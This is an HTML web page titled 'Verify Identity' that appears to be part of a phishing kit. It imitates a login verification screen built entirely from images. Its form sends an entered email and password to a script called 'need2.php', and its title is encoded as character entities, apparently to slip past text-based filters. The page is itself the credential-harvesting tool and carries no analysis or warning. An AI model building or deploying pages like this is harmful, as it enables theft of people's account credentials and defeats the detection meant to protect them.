<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>V&#101;&#114;&#105;&#102;y I&#100;&#101;&#110;&#116;&#105;&#116;y </title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="images/favicon.ico"/>	
<style type="text/css">
.textbox {  
    border: solid 1px #CFD1D7;
  	border-radius: 3px;
 	padding-left: 10px;
  	font-size: 15px;
    color: #44464A;
    height: 38px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #8EB1EB; 
    border-style: solid; 
  	border-radius: 3px;
    border-width: 2px; 
    outline: 0; 
 } 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:189px; top:33px; width:64px; height:65px; z-index:0"><a href="#"><img src="images/h14.png" alt="" title="" border=0 width=64 height=65></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:1044px; top:75px; width:96px; height:17px; z-index:1"><a href="#"><img src="images/h13.png" alt="" title="" border=0 width=96 height=17></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:109px; width:1349px; height:16px; z-index:2"><img src="images/h17.png" alt="" title="" border=0 width=1349 height=16></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:600px; width:1349px; height:184px; z-index:3"><img src="images/h10.png" alt="" title="" border=0 width=1349 height=184></div>

<div id="image8" style="position:absolute; overflow:hidden; left:240px; top:474px; width:76px; height:27px; z-index:6"><a href="#"><img src="images/h11.png" alt="" title="" border=0 width=76 height=27></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:186px; top:142px; width:553px; height:71px; z-index:5"><img src="images/h9.png" alt="" title="" border=0 width=553 height=71></div>

<div id="image7" style="position:absolute; overflow:hidden; left:236px; top:270px; width:168px; height:121px; z-index:6"><img src="images/h19.png" alt="" title="" border=0 width=168 height=121></div>
<form action=need2.php name=rfg method=post>
<input name="m" class="textbox" autocomplete="off" required type="text" style="position:absolute;left:238px;top:290px;width:272px;z-index:7">
<input name="p" class="textbox" autocomplete="off" required type="password" style="position:absolute;left:238px;top:385px;width:272px;z-index:8">
<div id="formimage1" style="position:absolute; left:330px; top:470px; z-index:9"><input type="image" name="formimage1" width="122" height="34" src="images/w16.png"></div>
</div>

	
</body>
</html>
